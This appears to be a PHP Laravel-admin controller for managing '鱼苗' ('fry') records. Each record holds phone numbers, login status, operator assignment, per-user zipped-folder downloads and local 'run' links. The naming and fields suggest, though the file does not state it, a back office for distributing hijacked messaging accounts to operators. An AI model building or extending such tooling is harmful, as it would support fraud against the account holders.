<?php

namespace App\Admin\Controllers;

use App\Models\BannerModel;
use App\Models\ChatModel;
use App\Models\FryModel;
use App\Models\UserModel;
use App\Models\VipModel;
use App\Service\HelperService;
use Encore\Admin\Facades\Admin;
use Encore\Admin\Auth\Database\Administrator;
use Encore\Admin\Controllers\AdminController;
use Encore\Admin\Form;
use Encore\Admin\Grid;
use Encore\Admin\Show;
use URL;

class FryController extends AdminController
{
    /**
     * Title for current resource.
     *
     * @var string
     */
    protected $title = '鱼苗管理/';

    /**
     * 'admin_id', // 被分配给那个后台管理人员
     * 'language', // 语种
     * 'status',  // 状态 1已登陆
     * 'uid', // 用户的uid
     * "phone_number", // 用户的手机号
     * 'remark', // 备注
     * 'bg_img_url', // 背景图
     * 'nick_name', // 昵称
     * 'created_at', //  创建时间
     * 'updated_at', // 更新时间
     * @return Grid
     */
    protected function grid(): Grid
    {
        $grid = new Grid(new FryModel());

        if (Admin::user()->id != 1) {
            $grid->model()
            ->where('admin_id', Admin::user()->id)
            ->orWhere('admin_id', (string)Admin::user()->id);
        }
        $grid->filter(function($filter){
            // 去掉默认的id过滤器
            //$filter->disableIdFilter();
            // 在这里添加字段过滤器
            $filter->like('phone_number', '手机号');
            $filter->like('uid', '输入uid');
            $filter->like('admin_id', '输入管理员id');
        });
        $grid->disableBatchActions();
        $grid->actions(function ($actions) {
            if (Admin::user()->id != 1) {
                $actions->disableDelete();
            }
        });

        $grid->column('_id', __('ID'));
        $grid->column('phone_number', __('手机号'));
        $grid->column('nick_name', __('昵称'));
        $grid->column('is_local', __('是否本地'))->display(function ($v) {
            if ($v === true) {
                $dowUrl = 'https://' . request()->getHost() . '/api/zipFolder?file_name=' . $this->uid;
                return vsprintf('<a target="_blank" href="%s">点击下载或复制下面地址下载</a>', [$dowUrl]) . '<br>' . $dowUrl;
            }
            return "本地出码缓存";
        })->style("text-align: center;");

        $adminList = Administrator::all()->pluck("username", "id");
        $grid->column('admin_id', __('指派所属'))->editable('select', $adminList);

        $grid->column('status', __('状态'))->display(function ($v) {
            return $v == 1 ? '已登' : '未登';
        })->editable();
        $grid->column('uid', __('用户uid'));
        $grid->column('language', __('语种'))->display(function ($v) {
            $arr = HelperService::getInstance()->getLang();
            $chatInfo = ChatModel::where('uid', $v)->first();
            if (!$chatInfo) {
                return $arr["zh"];
            }
            return $arr[$chatInfo->language];
        });
        $grid->column('remark', __('备注'))->editable();
        $grid->column('_', __('打开'))->display(function ($v) {
            return "<a target='_blank' href=http://127.0.0.1:8080/run?file_name=" . $this->uid . ">" . $this->uid . "</a>";
        });
        $grid->column('created_at', __('更新时间'))->display(function ($v) {
             return date('Y-m-d H:i:s', $v + 28800);
        });

        return $grid;
    }

    /**
     * Make a show builder.
     *
     * @param mixed $id
     * @return Show
     */
    protected function detail(mixed $id): Show
    {
        $show = new Show(FryModel::findOrFail($id));


//        $show->field('_id', __('ID'));
//
//        $show->field('_id', __('ID'));
//        $show->field('name', __('VIP类型名称'));
//        $show->field('diamond_number', __('兑换所需钻石数量'));
//        $show->field('share_number', __('邀请人数'));
//        $show->field('long_time', __('有效时长'));
//
//        $show->field('bg_img_url', __('背景图'))->image();
//        $show->field('weight', __('排序权重'));
//        $show->field('created_at', __('创建时间'));
//        $show->field('updated_at', __('更新时间'));

        return $show;
    }

    /**
     * Make a form builder.
     * @return Form
     */
    protected function form(): Form
    {
        $form = new Form(new FryModel());

        $adminList = Administrator::all()->pluck("username", "id");
        $form->select('admin_id', __('指派所属'))->options($adminList);
        $form->select('status', __('状态'))->options([
            1 => '已登陆',
            0 => '掉线',
        ])->default(1);
        $form->text('uid', __('uid'))->required();
        $form->text('phone_number', __('phone_number'))->required();
        $form->text('nick_name', __('nick_name'))->required();
        $form->text('status', __('status'))->default(3)->required();

        $form->text('language', __('language'))->default('zh_cn')->required();
        $form->text('is_local', __('is_local'))->default(1)->required();
        $form->number('updated_at', __('updated_at'))->default(time())->required();
        $form->text('remark', __('备注'));
        $form->saving(function (Form $form) {
            $form->updated_at = time();

        });


        return $form;
    }
}
